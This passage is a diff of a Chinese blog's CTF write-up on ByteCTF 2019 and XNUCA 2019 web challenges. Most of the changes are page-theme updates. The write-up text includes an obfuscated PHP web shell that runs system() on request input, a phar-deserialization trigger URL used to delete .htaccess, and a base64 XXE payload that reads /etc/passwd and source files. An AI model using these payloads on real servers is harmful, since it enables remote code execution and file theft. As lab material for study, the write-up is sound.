 <p>第一个参数为文件名，第二个参数可以设置使用的模式。（<a href="https://www.php.net/manual/en/zip.constants.php#ziparchive.constants.overwrite）" target="_blank" rel="noopener">https://www.php.net/manual/en/zip.constants.php#ziparchive.constants.overwrite）</a></p>
-<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190909145636472.png" alt="在这里插入图片描述"></p>
+<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190909145636472.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p>使用上述两个模式并将文件名设为<code>.htaccess</code>的路径，即可删除该文件。</p>
 <p>5、知道整个构造思路了之后，先得到<code>.htaccess</code>文件的路径，并上传一个shell.php如下（使用php可变函数拼接字符绕过过滤），<strong>上传后记下文件路径</strong>：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//shell.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">"syste"</span>;</span><br><span class="line">$b=<span class="string">"m"</span>;</span><br><span class="line">$c=$a.$b;</span><br><span class="line">$d=$c($_REQUEST[<span class="string">'a'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
@@ -179,7 +238,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?filename=eec2d95bc618625503306c10fad5d37d.phar&amp;filepath=php://filter/resource=phar://sandbox/2ad1c8a81d5d1d24dcac4f7a110a605a/eec2d95bc618625503306c10fad5d37d.phar</span><br></pre></td></tr></table></figure>
 <p>即可触发phar反序列化并删除<code>.htaccess</code>文件。</p>
 <p>注意删除后不能再次访问<code>upload.php</code>，否则会再生成.htaccess，直接访问刚才上传shell返回的路径即可RCE。</p>
-<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190909155849502.png" alt="在这里插入图片描述"></p>
+<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190909155849502.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p><br></p>
 <h1><span id="bytectf_2019-boringcode">ByteCTF_2019 BoringCode</span></h1><p>源码如下：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid_url</span><span class="params">($url)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (filter_var($url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/data:\/\//i'</span>, $url)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>]))&#123;</span><br><span class="line">    $url = $_POST[<span class="string">'url'</span>];</span><br><span class="line">    <span class="keyword">if</span> (is_valid_url($url)) &#123;</span><br><span class="line">        $r = parse_url($url);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/baidu\.com$/'</span>, $r[<span class="string">'host'</span>])) &#123;</span><br><span class="line">            $code = file_get_contents($url);</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $code)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span>, $code)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'bye~'</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">eval</span>($code);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"error: host not allowed"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"error: invalid url"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -210,7 +269,7 @@
 </ul>
 <p>但是问题是我们并不能在最后一个函数中使用参数<code>.</code>，所以就得找到一个函数可以不用参数就返回<code>.</code></p>
 <p>存在函数<code>localeconv()</code> ，函数返回一包含本地数字及货币格式信息的数组。</p>
-<p>其返回值如下：<br><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190916152254728.png" alt="在这里插入图片描述"><br>可以看到第一个正好是我们需要的<code>.</code>，下面就需要将它取出来。</p>
+<p>其返回值如下：<br><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190916152254728.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>可以看到第一个正好是我们需要的<code>.</code>，下面就需要将它取出来。</p>
 <p>又存在如下限制：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">'/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span>, $code)</span><br></pre></td></tr></table></figure>
 <p><code>nt</code>被过滤了，所以<code>current()</code>不能使用，但是存在一个别名<code>pos()</code>，所以可以用<code>pos(localeconv())</code>来生成<code>.</code>.</p>
@@ -234,7 +293,7 @@
 <p>重复发包，当秒数为46时，即可读到flag。</p>
 <p><br></p>
 <h1><span id="rss">rss</span></h1><p>1、进入页面后是一个订阅RSS的功能，限制了域名：</p>
-<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190909170200995.png" alt="在这里插入图片描述"></p>
+<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190909170200995.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p>2、实际上RSS 是使用 XML 编写，那么就可能存在XXE漏洞。</p>
 <p>参考：<a href="https://mikeknoop.com/lxml-xxe-exploit/" target="_blank" rel="noopener">https://mikeknoop.com/lxml-xxe-exploit/</a></p>
 <p>上面文章中给了一个带有恶意ENTITY标记的RSS有效负载如下：</p>
@@ -243,14 +302,14 @@
 <p>参考：<a href="https://www.jianshu.com/p/80ce73919edb" target="_blank" rel="noopener">https://www.jianshu.com/p/80ce73919edb</a></p>
 <p>因为php是不关心MIME类型的，所以我们可以构造MIME类型来绕过对域名的过滤。</p>
 <p>将上述xml进行base64编码：</p>
-<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190909171158259.png" alt="在这里插入图片描述"></p>
+<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190909171158259.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p>所以传入：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://baidu.com/plain;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPCFET0NUWVBFIHRpdGxlIFsgPCFFTEVNRU5UIHRpdGxlIEFOWSA+CjwhRU5USVRZIHh4ZSBTWVNURU0gImZpbGU6Ly8vZXRjL3Bhc3N3ZCIgPl0+Cjxyc3MgdmVyc2lvbj0iMi4wIiB4bWxuczphdG9tPSJodHRwOi8vd3d3LnczLm9yZy8yMDA1L0F0b20iPgo8Y2hhbm5lbD4KICAgIDx0aXRsZT5UaGUgQmxvZzwvdGl0bGU+CiAgICA8bGluaz5odHRwOi8vZXhhbXBsZS5jb20vPC9saW5rPgogICAgPGRlc2NyaXB0aW9uPkEgYmxvZyBhYm91dCB0aGluZ3M8L2Rlc2NyaXB0aW9uPgogICAgPGxhc3RCdWlsZERhdGU+TW9uLCAwMyBGZWIgMjAxNCAwMDowMDowMCAtMDAwMDwvbGFzdEJ1aWxkRGF0ZT4KICAgIDxpdGVtPgogICAgICAgIDx0aXRsZT4meHhlOzwvdGl0bGU+CiAgICAgICAgPGxpbms+aHR0cDovL2V4YW1wbGUuY29tPC9saW5rPgogICAgICAgIDxkZXNjcmlwdGlvbj5hIHBvc3Q8L2Rlc2NyaXB0aW9uPgogICAgICAgIDxhdXRob3I+YXV0aG9yQGV4YW1wbGUuY29tPC9hdXRob3I+CiAgICAgICAgPHB1YkRhdGU+TW9uLCAwMyBGZWIgMjAxNCAwMDowMDowMCAtMDAwMDwvcHViRGF0ZT4KICAgIDwvaXRlbT4KPC9jaGFubmVsPgo8L3Jzcz4=</span><br></pre></td></tr></table></figure>
 <p>可以看到：</p>
-<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190909171403182.png" alt="在这里插入图片描述"></p>
+<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190909171403182.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p>4、因为不知道路径，我们先读一下源码，用下面的ENTITY替换一下上面payload中的（因为是php文件，所以要base64一下才能读出来）：</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">xxe</span> <span class="attr">SYSTEM</span> "<span class="attr">php:</span>//<span class="attr">filter</span>/<span class="attr">read</span>=<span class="string">convert.base64-encode/resource</span>=<span class="string">index.php</span>" &gt;</span>]&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190909172410971.png" alt="在这里插入图片描述"></p>
+<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190909172410971.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p>base解码后得到：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'display_errors'</span>,<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">'display_startup_erros'</span>,<span class="number">1</span>);</span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'routes.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__autoload</span><span class="params">($class_name)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="string">'./classes/'</span>.$class_name.<span class="string">'.php'</span>)) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">require_once</span> <span class="string">'./classes/'</span>.$class_name.<span class="string">'.php'</span>;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(file_exists(<span class="string">'./controllers/'</span>.$class_name.<span class="string">'.php'</span>)) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">require_once</span> <span class="string">'./controllers/'</span>.$class_name.<span class="string">'.php'</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>没什么信息，同样的方法再读一下routes.php的源码：</p>
@@ -260,94 +319,196 @@
 <p><br></p>
 <p>参考：<br><a href="https://altman.vip/2019/09/09/ByteCTF-WEB/" target="_blank" rel="noopener">https://altman.vip/2019/09/09/ByteCTF-WEB/</a></p>
 
+            <hr>
+          </div>
+          <br>
+          <div>
+            
+              <p>
+                <i class="iconfont icon-inbox"></i>
+                
+                  <a class="hover-with-bg" href="/categories/Writeup">Writeup</a>
+                  &nbsp;
+                
+              </p>
+            
+            <p>
+              <i class="iconfont icon-tag"></i>
+              
+                <a class="hover-with-bg" href="/tags/Writeup">Writeup</a>
+              
+            </p>
+            
+              <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="d-none d-lg-block col-lg-2 toc-container">
+      
+  <div id="toc">
+    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
+    <div id="tocbot"></div>
+  </div>
+
+    </div>
+  </div>
+</div>
+
+<!-- custom -->
+
+
+<!-- Comments -->
+<div class="col-lg-7 mx-auto nopadding-md">
+  <div class="container comments mx-auto" id="comments">
+    
+      <br><br>
+      
+      <div class="disqus" style="width:100%">
+  <div id="disqus_thread"></div>
+  <script>
+    var disqus_shortname = 'Lethe';
+    var disqus_config = function () {
+      this.page.url = 'https://lethe.site/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/';
+      this.page.identifier = '/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/';
+    };
+    (function () {
+      var d = document, s = d.createElement('script');
+      s.type = 'text/javascript';
+      s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+  <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow noopener">comments
+      powered by Disqus.</a></noscript>
+</div>
+    
+  </div>
+</div>
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
       </div>
     </div>
   </div>
 </div>
-<div class="lx-navigation">
-	<div class="lx-cover prev lx-cover-sm" style="background-image: url(/images/footer_1.jpg)">
-		<div class="overlay"></div>
-		<a class="copy" href="/2019/09/19/学一下Ajax/">
-			<div class="display-t">
-				<div class="display-tc">
-					<div>
-						<span>Next</span>
-						<h3>学一下Ajax</h3>
-					</div>
-				</div>
-			</div>
-		</a>
-	</div>
-        <div class="lx-cover next lx-cover-sm" style="background-image: url(/images/footer_2.jpg)">
-		<div class="overlay"></div>
-		<a class="copy" href="/2019/09/06/利用SoapClient类进行SSRF-CRLF攻击/">
-			<div class="display-t">
-				<div class="display-tc">
-					<div>
-						<span>Prev</span>
-						<h3>利用SoapClient类进行SSRF+CRLF攻击</h3>
-					</div>
-				</div>
-			</div>
-		</a>
-	</div>
-</div>
-</div>
-<div class="comment"><div id="comments"></div></div>
-<footer>
-  <div>
-  Copyright &copy; 2019.<a href="/">Lethe | 忘川</a>
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+    <i class="iconfont icon-love"></i>
+    <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    <br>
+    
   </div>
 </footer>
-</div>
 
-<button class="menu-trigger"></button>
-<div class="menu">
-  <div class="menu-head">
-    <span class="layer">
-      <div class="col">
-        <div class="row for-pic">
-          <div class="profile-pic">
-            <a href="/"><img src="/images/2.jpg" alt="Lethe"></a>
-          </div>
-        </div>
-        <div class="row for-name">
-          <p>Lethe</p>
-          <span class="tagline">Hello, World!</span>
-        </div>
-      </div>
-    </span>
-  </div>
-  <nav class="menu-container">
-  <ul class="menu-items">
-    <li><a href="/"><i class="fa fa-home fa-fw"></i>首页</a></li>
-    <li><a href="/archives/"><i class="fa fa-archive fa-fw"></i>归档</a></li>
-    <li class="has-sub"><span class="dropdown-heading">
-      <i class="fa fa-bookmark fa-fw"></i>页面</span>
-        <ul>
-          <li><a href="/about">关于</a></li>
-        </ul>
-    </li>
-    <li class="has-sub"><span class="dropdown-heading">
-      <i class="fa fa-link fa-fw"></i>友链</span>
-        <ul>
-          <li> <a href="https://hiworldalice.github.io/" target="_blank">Tunt</a></li>
-        <li> <a href="https://3nd.xyz" target="_blank">3ND</a></li>
-        </ul>
-    </li>
-  </ul>
-  </nav>
-</div>
-
-<div class="gototop js-top">
-  <a href="#" class="js-gotop"><i class="fa fa-arrow-up"></i></a>
-</div>
-<script src="/js/jquery.easing.min.js"></script>
-<script src="/js/jquery.waypoints.min.js"></script>
-<script src="/js/jquery.stellar.min.js"></script>
+<!-- SCRIPTS -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/popper/popper.min.js"></script>
+<script src="/lib/bootstrap/js/bootstrap.min.js"></script>
+<script src="/lib/mdbootstrap/js/mdb.min.js"></script>
 <script src="/js/main.js"></script>
 
+  <script src="/js/lazyload.js"></script>
 
+
+  
+    <script src="/lib/tocbot/tocbot.min.js"></script>
+  
+  <script src="/js/post.js"></script>
+
+
+  <script src="/lib/prettify/prettify.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+  <script src="/lib/typed/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "ByteCTF_2019&XNUCA_2019部分web题复现&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+  <script src="/lib/anchor/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "false",
+      
+      icon: "§"
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script>
+    if (/(iPhone|iPad|iPod|iOS)/i.test(navigator.userAgent) || (/Safari/i.test(navigator.userAgent) && !/Chrome/i.test(navigator.userAgent))) {
+      $("#background").css("background-attachment", "scroll");
+    }
+  </script>
 
 </body>
 </html>
